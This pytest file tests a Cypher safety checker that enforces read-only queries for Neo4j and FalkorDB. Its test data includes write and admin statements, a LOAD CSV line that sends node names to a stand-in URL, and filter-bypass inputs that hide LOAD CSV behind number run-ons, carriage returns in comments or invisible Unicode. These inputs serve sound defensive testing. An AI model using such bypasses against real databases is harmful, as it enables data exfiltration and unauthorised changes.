# =============================================================================
# MIT License
# Copyright (c) 2026 Aparavi Software AG
# =============================================================================

"""Token-level read-path check used by Neo4j's read_query (defence in depth)."""

from __future__ import annotations

import pytest

from ai.common.graph.cypher_safety import (
    CypherInputError,
    CypherRefused,
    check_read_only_cypher,
    check_read_query_statement,
)
from ai.common.graph.graph_errors import GraphToolError

READS = [
    'MATCH (n) RETURN n LIMIT 25',
    'MATCH (a)-[r]->(b) RETURN a, r, b',
    'MATCH (a)--(b) RETURN count(*)',  # -- is a relationship, never a comment
    'OPTIONAL MATCH (n:Person) WITH n UNWIND [1, 2] AS x RETURN n, x',
    "MATCH (n) WHERE n.note = 'CREATE (x) DELETE y' RETURN n",
    'MATCH (n) WHERE n.note = "SET n.x = 1" RETURN n',
    "MATCH (n) WHERE n.note = 'it\\'s; DROP' RETURN n",
    'MATCH (n) // DELETE n\nRETURN n',
    'MATCH (n) /* MERGE (m) */ RETURN n',
    'MATCH (n) RETURN n.create, n.delete, n.set, n.remove',
    'MATCH (n:Create:Delete)-[:SET]->(m:`MERGE`) RETURN n',
    'RETURN {create: 1, set: 2, delete: 3} AS m',
    'MATCH (n) WHERE n.x = $create RETURN n',
    'MATCH (start)-[r]->(stop) RETURN start, stop',
    'MATCH (n) RETURN `CREATE` AS x',
    'CALL db.labels()',
    'CALL db.labels() YIELD label RETURN label',
    'call DB.LABELS() yield label return label',
    'CALL `db`.`labels`()',
    'CALL db.relationshipTypes()',
    'CALL db.propertyKeys()',
    'CALL db.schema.nodeTypeProperties()',
    'CALL db.schema.relTypeProperties()',
    'CALL db.schema.visualization()',
    'CALL db.labels',
    'CALL { MATCH (n) RETURN n } RETURN n',
    'MATCH (a) CALL (a) { MATCH (a)-->(b) RETURN b } RETURN b',
    'SHOW INDEXES',
    'SHOW ALL CONSTRAINTS',
    'SHOW PROCEDURES',
    'MATCH (é:Ünïcode) RETURN é',
]

WRITES = [
    ('CREATE (n)', 'CREATE'),
    ('create (n)', 'CREATE'),
    ('MATCH (n) SET n.x = 1', 'SET'),
    ('MATCH (n) DETACH DELETE n', 'DETACH'),
    ('MATCH (n) DELETE n', 'DELETE'),
    ('MERGE (n:P {k: 1})', 'MERGE'),
    ('MATCH (n) REMOVE n.x', 'REMOVE'),
    ('DROP INDEX i', 'DROP'),
    ('FOREACH (x IN [1] | CREATE (:N))', 'FOREACH'),
    ('INSERT (n:N)', 'INSERT'),
    ('MATCH (n) WITH n CALL { WITH n SET n.x = 1 } RETURN n', 'SET'),
    ('MATCH (n) WHERE n.x = "a" CREATE (m) RETURN m', 'CREATE'),
    ('MATCH (n) RETURN n // ok\rDELETE n', 'DELETE'),
]

REFUSED_OTHER = [
    ('LOAD CSV FROM "file:///x" AS row RETURN row', 'LOAD CSV'),
    ('GRANT ROLE reader TO bob', 'GRANT'),
    ('DENY READ ON GRAPH * TO bob', 'DENY'),
    ('REVOKE ROLE reader FROM bob', 'REVOKE'),
    ('STOP DATABASE neo4j', 'STOP DATABASE'),
    ('START DATABASE neo4j', 'START DATABASE'),
    ('ALTER USER bob SET PASSWORD "x"', 'ALTER USER'),
    ('RENAME ROLE a TO b', 'RENAME ROLE'),
    ('TERMINATE TRANSACTIONS "neo4j-1"', 'TERMINATE TRANSACTIONS'),
    ('USE system SHOW USERS', 'USE'),
    ('SHOW USERS', 'SHOW USERS'),
    ('SHOW DATABASES', 'SHOW DATABASES'),
    ('CALL db.createLabel("X")', 'db.createLabel'),
    ('CALL apoc.periodic.iterate("MATCH (n) RETURN n", "DELETE n", {})', 'apoc.periodic.iterate'),
    ('CALL `apoc`.`cypher`.`runWrite`("CREATE (n)", {})', 'apoc.cypher.runWrite'),
    ('CALL apoc.load.json("http://example.invalid")', 'apoc.load.json'),
    ('CALL db.schema.nodeTypeProperties2()', 'db.schema.nodeTypeProperties2'),
    ('CALL dbms.components()', 'dbms.components'),
    ('MATCH (n) CALL { CALL db.createLabel("X") } RETURN n', 'db.createLabel'),
    ('CALL db.`labels`.extra()', 'db.labels.extra'),
]


@pytest.mark.parametrize('cypher', READS)
def test_reads_pass(cypher):
    check_read_only_cypher(cypher)


@pytest.mark.parametrize('cypher,word', WRITES)
def test_writes_refused(cypher, word):
    with pytest.raises(CypherRefused) as err:
        check_read_only_cypher(cypher)
    assert err.value.headline.startswith('Refused: ')
    assert word in err.value.headline


@pytest.mark.parametrize('cypher,what', REFUSED_OTHER)
def test_admin_use_show_and_unlisted_procedures_refused(cypher, what):
    with pytest.raises(CypherRefused) as err:
        check_read_only_cypher(cypher)
    assert what.lower() in str(err.value).lower()


@pytest.mark.parametrize('cypher', ["MATCH (n) WHERE n.x = 'open", 'MATCH (n) /* open', 'MATCH (`open) RETURN 1'])
def test_unterminated_literals_refused(cypher):
    with pytest.raises(CypherRefused, match='unterminated'):
        check_read_only_cypher(cypher)


def test_refusal_is_a_graph_tool_error_with_headline_and_detail():
    with pytest.raises(GraphToolError) as err:
        check_read_only_cypher('CALL apoc.do.it()')
    headline, _, detail = str(err.value).partition('\n')
    assert headline == 'Refused: CALL apoc.do.it is not on the read-only procedure allowlist'
    assert detail.startswith('Allowed: db.labels, db.propertyKeys, db.relationshipTypes')


def test_custom_allowlist():
    check_read_only_cypher('CALL my.proc()', allowed_procedures=frozenset({'my.proc'}))
    with pytest.raises(CypherRefused):
        check_read_only_cypher('CALL db.labels()', allowed_procedures=frozenset({'my.proc'}))


# ---------------------------------------------------------------------------
# check_read_query_statement: the rule every driver's read_query applies
# ---------------------------------------------------------------------------

LOAD_CSV = [
    "LOAD CSV FROM 'https://example.invalid/x.csv' AS row RETURN row",
    'load csv with headers from $url as row return row',
    "MATCH (n) WITH 'https://example.invalid/?q=' + n.name AS u LOAD CSV FROM u AS row RETURN count(row)",
    "LOAD /* comment */ CSV FROM 'file:///x' AS r RETURN r",
    "CALL { LOAD CSV FROM 'file:///x' AS r RETURN r } RETURN 1",
]

NOT_LOAD_CSV = [
    'MATCH (n:Load) RETURN n.csv',
    'MATCH (n) RETURN n.load, n.LOAD',
    "RETURN 'LOAD CSV FROM x' AS s",
    'MATCH (load) RETURN load',
    'WITH 1 AS load RETURN load',
    'MATCH (n {load: 1}) RETURN n',
    'MATCH (n) RETURN `LOAD` AS csv',
    'MATCH (n) // LOAD CSV FROM x\nRETURN n',
    # Procedures and writes are each driver's own read boundary, not this check.
    'CALL db.labels()',
    'MATCH (n) SET n.x = 1',
]


@pytest.mark.parametrize('cypher', LOAD_CSV)
def test_read_query_statement_refuses_load_csv(cypher):
    with pytest.raises(CypherRefused) as err:
        check_read_query_statement(cypher)
    assert err.value.headline == 'Refused: LOAD CSV is not allowed on the read-only path'


@pytest.mark.parametrize('cypher', NOT_LOAD_CSV)
def test_read_query_statement_passes_everything_else(cypher):
    check_read_query_statement(cypher)


@pytest.mark.parametrize(
    'cypher,what',
    [
        ("MATCH (n) WHERE n.x = 'open", 'string literal'),
        ('MATCH (n) /* open', 'comment'),
        ('MATCH (`open) RETURN 1', 'back-quoted name'),
    ],
)
def test_read_query_statement_reports_unterminated_text_as_invalid_input(cypher, what):
    """Unterminated text is an input error, not a refusal (a "Refused:" headline reads as a refused write)."""
    with pytest.raises(GraphToolError) as err:
        check_read_query_statement(cypher)
    assert err.value.headline == f'Invalid read_query input: unterminated {what}'
    assert not isinstance(err.value, CypherRefused)
    assert isinstance(err.value, ValueError)


def test_read_query_statement_names_the_calling_tool():
    with pytest.raises(GraphToolError) as err:
        check_read_query_statement("RETURN 'open", tool='query')
    assert err.value.headline == 'Invalid query input: unterminated string literal'
    with pytest.raises(CypherRefused) as err:
        check_read_query_statement("LOAD CSV FROM 'file:///x' AS r RETURN r", tool='query', detail='Some detail.')
    assert str(err.value) == 'Refused: LOAD CSV is not allowed on the read-only path\nSome detail.'


def test_read_query_statement_default_detail_is_unchanged():
    with pytest.raises(CypherRefused) as err:
        check_read_query_statement("LOAD CSV FROM 'file:///x' AS r RETURN r")
    assert err.value.detail == 'read_query reads only the configured graph.'


# ---------------------------------------------------------------------------
# Text that engines read differently is refused or read every way (GX-CMP-01)
# ---------------------------------------------------------------------------

URL = "'https://example.invalid/x.csv'"

# (statement, the number as written, the character it runs into)
NUMBER_RUNS_ON = [
    (f'MATCH (n:P) WITH n SKIP 0LOAD CSV FROM {URL} AS r RETURN r', '0', 'L'),
    (f'MATCH (n) WHERE n.v > 0.5LOAD CSV FROM {URL} AS r RETURN r', '0.5', 'L'),
    (f'MATCH (n) WHERE n.v > 1e3LOAD CSV FROM {URL} AS r RETURN r', '1e3', 'L'),
    (f'MATCH (n) WHERE n.v > 1. LOAD CSV FROM {URL} AS r RETURN r', '1', '.'),
    (f'MATCH (n) WHERE n.v > 1.LOAD CSV FROM {URL} AS r RETURN r', '1', '.'),
    (f'MATCH (n) WHERE n.v > .5LOAD CSV FROM {URL} AS r RETURN r', '5', 'L'),
    (f'MATCH (n) WHERE n.v > 0x1FLOAD CSV FROM {URL} AS r RETURN r', '0x1F', 'L'),
    (f'MATCH (n) WHERE n.v > 0o7LOAD CSV FROM {URL} AS r RETURN r', '0o7', 'L'),
    (f'MATCH (n) WHERE n.v > 1_000LOAD CSV FROM {URL} AS r RETURN r', '1_000', 'L'),
    ('RETURN 1eX AS x', '1', 'e'),
    ('RETURN 1_ AS x', '1', '_'),
    ('RETURN 1.5.2 AS x', '1.5', '.'),
    ('RETURN 1.e3 AS x', '1', '.'),
    ('RETURN 0o8 AS x', '0', 'o'),
    ('RETURN 12\u00e9 AS x', '12', '\u00e9'),
]

NUMBERS = [
    'RETURN 0, 7, 017, 1_000, 0x1F, 0XfF, 0o17, 1.5, .5, 1e3, 1E-3, 1.5e+3 AS x',
    'MATCH (n)-[*1..3]->(m) RETURN m',
    'MATCH (n)-[*..3]->(m) RETURN m',
    'RETURN [1, 2, 3][0..2] AS x, [1, 2, 3][1..] AS y',
    'RETURN -1+2*3-4/5%6^7 AS x',
    'MATCH (n) WHERE n.v1 > 2 AND n.x2y <> $p1 RETURN n LIMIT 10',
    'RETURN {k1: 1}.k1 AS x',
]


@pytest.mark.parametrize('cypher,number,follower', NUMBER_RUNS_ON)
def test_a_number_running_into_what_follows_is_invalid_input(cypher, number, follower):
    """FalkorDB ends a number at the first letter (0LOAD is 0 then LOAD); such text is refused, not guessed at."""
    with pytest.raises(CypherInputError) as err:
        check_read_query_statement(cypher)
    assert err.value.headline == f'Invalid read_query input: the number {number} runs into {follower!r}'


@pytest.mark.parametrize('cypher,number,follower', NUMBER_RUNS_ON)
def test_the_neo4j_check_refuses_a_number_running_into_what_follows(cypher, number, follower):
    with pytest.raises(CypherRefused) as err:
        check_read_only_cypher(cypher)
    assert err.value.headline == f'Refused: the number {number} runs into {follower!r}'


@pytest.mark.parametrize('cypher', NUMBERS)
def test_numbers_written_in_full_pass(cypher):
    check_read_query_statement(cypher)
    check_read_query_statement(cypher, ascii_only=True)
    check_read_only_cypher(cypher)


def test_a_long_number_is_shortened_in_the_headline():
    with pytest.raises(CypherInputError) as err:
        check_read_query_statement('RETURN ' + '9' * 40 + 'x')
    assert err.value.headline == f"Invalid read_query input: the number {'9' * 24}... runs into 'x'"


# A carriage return without a line feed ends a // comment on Neo4j but not on
# FalkorDB, so a quote, back-quote or /* after it opens a string, name or
# comment on one engine only.
CR_HIDDEN_LOAD_CSV = [
    f"MATCH (n:P) //\r'\nLOAD CSV FROM {URL} AS r RETURN r //'",
    f'MATCH (n) //\r"\nLOAD CSV FROM {URL} AS r RETURN r //"',
    f'MATCH (n) //\r`\nLOAD CSV FROM {URL} AS r RETURN r //`',
    f'MATCH (n) //\r/*\nLOAD CSV FROM {URL} AS r RETURN r //*/',
]


@pytest.mark.parametrize('cypher', CR_HIDDEN_LOAD_CSV)
def test_load_csv_after_a_carriage_return_in_a_comment_is_refused(cypher):
    with pytest.raises(CypherRefused) as err:
        check_read_query_statement(cypher)
    assert err.value.headline == 'Refused: LOAD CSV is not allowed on the read-only path'


@pytest.mark.parametrize(
    'cypher',
    [
        'MATCH (n) // note\r\nRETURN n',
        "MATCH (n) // it's\r\nRETURN n",
        'MATCH (n) //\rRETURN n',
        "MATCH (n) // a\rRETURN n // it's",
    ],
)
def test_carriage_returns_that_hide_nothing_pass(cypher):
    check_read_query_statement(cypher)


def test_text_one_reading_cannot_read_is_invalid_input():
    """The carriage-return reading leaves the quote open."""
    with pytest.raises(CypherInputError) as err:
        check_read_query_statement("MATCH (n) //\r'\nRETURN n")
    assert err.value.headline == 'Invalid read_query input: unterminated string literal'


def test_text_only_the_line_feed_reading_cannot_read_is_invalid_input():
    """The carriage-return reading closes the quote; the line-feed reading leaves the second quote open."""
    cypher = "MATCH (n) //\r'x\n' RETURN n"
    check_read_only_cypher(cypher)  # the carriage-return reading alone reads cleanly
    with pytest.raises(CypherInputError) as err:
        check_read_query_statement(cypher)
    assert err.value.headline == 'Invalid read_query input: unterminated string literal'


# ---------------------------------------------------------------------------
# ascii_only: no non-ASCII character outside string literals and back-quoted
# names (FalkorDB's read paths)
# ---------------------------------------------------------------------------

NON_ASCII_CODE = [
    (f'LOAD\u180eCSV FROM {URL} AS r RETURN r', 'U+180E'),
    ('MATCH (n)\u200bRETURN n', 'U+200B'),
    ('MATCH (n) RETURN n\u2028', 'U+2028'),
    ('MATCH (n)\u00a0RETURN n', 'U+00A0'),
    ('MATCH (\u00e9) RETURN \u00e9', 'U+00E9'),
    ('MATCH (n) // caf\u00e9\nRETURN n', 'U+00E9'),
    ('MATCH (n) /* \ufeff */ RETURN n', 'U+FEFF'),
    ('MATCH (a\u00e9) RETURN 1', 'U+00E9'),
    ('MATCH (n) WHERE n.x = $p\u00e9 RETURN n', 'U+00E9'),
    # Code only when the // comment ends at the line feed, not at the carriage return.
    ("RETURN 1 //\r'\n\u200b'", 'U+200B'),
]


@pytest.mark.parametrize('cypher,code', NON_ASCII_CODE)
def test_ascii_only_refuses_non_ascii_outside_strings_and_names(cypher, code):
    with pytest.raises(CypherInputError) as err:
        check_read_query_statement(cypher, ascii_only=True)
    assert err.value.headline == f'Invalid read_query input: character {code} outside a string or back-quoted name'


@pytest.mark.parametrize(
    'cypher',
    [
        "MATCH (n) WHERE n.name = 'Jos\u00e9\u200b' RETURN n",
        'MATCH (n:`\u00dcn\u00efcode`) RETURN n.`\u00e9` AS `\u00f1`',
        'RETURN "\u65e5\u672c\u2028" AS x',
        "RETURN 'a\\'\u00e9' AS x",
    ],
)
def test_ascii_only_keeps_strings_and_back_quoted_names(cypher):
    check_read_query_statement(cypher, ascii_only=True)


def test_non_ascii_code_passes_without_ascii_only():
    check_read_query_statement('MATCH (\u00e9:\u00dcn\u00efcode) RETURN \u00e9 // caf\u00e9')
